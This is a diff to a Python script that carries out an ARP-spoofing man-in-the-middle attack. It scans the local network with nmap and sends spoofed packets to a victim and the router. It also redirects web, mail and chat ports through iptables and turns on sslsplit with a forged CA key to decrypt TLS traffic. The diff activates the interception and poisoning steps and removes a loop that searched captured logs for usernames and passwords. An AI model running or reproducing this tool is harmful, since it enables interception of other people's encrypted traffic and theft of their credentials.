@@ -4,6 +4,7 @@ import subprocess
 import socket
 import re
 import fcntl
+import keyboard
 from scapy.all import *
 from time import *
 
@@ -26,10 +27,16 @@ def nicInfo():
     (out, err) = proc.communicate()
     ipaddr = out.decode("utf-8")
     ip = re.findall("\d+\.\d+\.\d+\.\d+\/\d+", ipaddr)
-    mac = re.findall(
-        "[0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}", ipaddr)
-    return ip, mac
+    # mac = re.findall(
+    #     "[0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}", ipaddr)
+    return ip
 
+def getNic():
+    proc = subprocess.Popen(["ip route"], stdout=subprocess.PIPE, shell=True)
+    (out, err) = proc.communicate()
+    nic = out.decode("utf-8")
+    nic = re.split(" ",nic)
+    return nic[4]
 
 """
 by "nmap" command, we can scan all device which have 
@@ -67,7 +74,8 @@ MAC address : https://stackoverflow.com/questions/4260467/what-is-a-regular-expr
 """
 https://stackoverflow.com/questions/159137/getting-mac-address
 """
-def getHwAddr(ifname):
+
+def getMac(ifname):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack(
         '256s', bytes(ifname, 'utf-8')[:15]))
@@ -84,14 +92,14 @@ def enable_port_forwarding():
     flag = 1
     flag = str(flag)
     os.system('echo ' + flag + ' > /proc/sys/net/ipv4/ip_forward')
-    #os.system('iptables -t nat -F')
+    os.system('iptables -t nat -F')
     os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080')
     os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443')
     os.system('iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443')
     os.system('iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443')
     os.system('iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443')
     os.system('iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080')
-    #os.system('sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080')
+    os.system('sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080')
 
 def disable_port_forwarding():
     flag = 0
@@ -100,26 +108,25 @@ def disable_port_forwarding():
 
 if __name__ == "__main__":
     
-    # get ip without /24
-    ip      = getHostIp()
-    hostip  = ip 
-    hostmac = getHwAddr('enp0s3')
-    routerIp = get_default_gateway_linux()
-    routerMac = ""
+    ip          = getHostIp()
+    nic         = getNic()
+    hostip      = ip 
+    hostmac     = getMac(nic)
+    routerIp    = get_default_gateway_linux()
+    routerMac   = ""
 
     # ip and MAC address of command "ip addr"
     # search Ip with subnet mask by using ip we already know
     # example:
     #   nicip: 192.168.1.1/24, 192.168.1.2/24, etc
     #   ip : 192.168.1.1
-    (nicip, nicmac) = nicInfo()
+    nicip = nicInfo()
     for i in nicip:
         # print(ip, " ", i.split("/")[0])
         if(i.split("/")[0]==ip):
             ip = i
             break
 
-    print(nicmac)
     result = nmap(ip)
     print(result)
 
@@ -133,7 +140,9 @@ if __name__ == "__main__":
         if(i == hostip):
             ip.remove(i)
             break
-        
+
+    print(ip)
+    print(mac)
     _len = len(ip)
     for i in range(0, _len):
         if(ip[i] == routerIp):
@@ -144,6 +153,7 @@ if __name__ == "__main__":
 
     print("")
 
+    print("nic card: ", nic)
     print("router Ip: %-18s MAC: %s" % (routerIp,routerMac))
     print("host   Ip: %-18s MAC: %s" % (hostip, hostmac))
     # print("host MAC", hostmac)
@@ -171,14 +181,14 @@ if __name__ == "__main__":
 
     enable_port_forwarding()
 
-    for file in os.listdir("logdir/"):
-        with open(file) as f:
-            for line in f:
-                if ('username=' in line) and ("password" in line):
-                    print("Find: ",line)
-                
+    while(1):
+        try:
+            if(keyboard.is_pressed('q')):
+                print("Detect keyboard q input, Bye")
+                break
+        except:
+            send(victimpacket)
+            send(routerpacket)    
+            sleep(2)
 
-    # while(1):
-    #     send(victimpacket)
-    #     send(routerpacket)    
-    #     sleep(2)
+    print("Done")
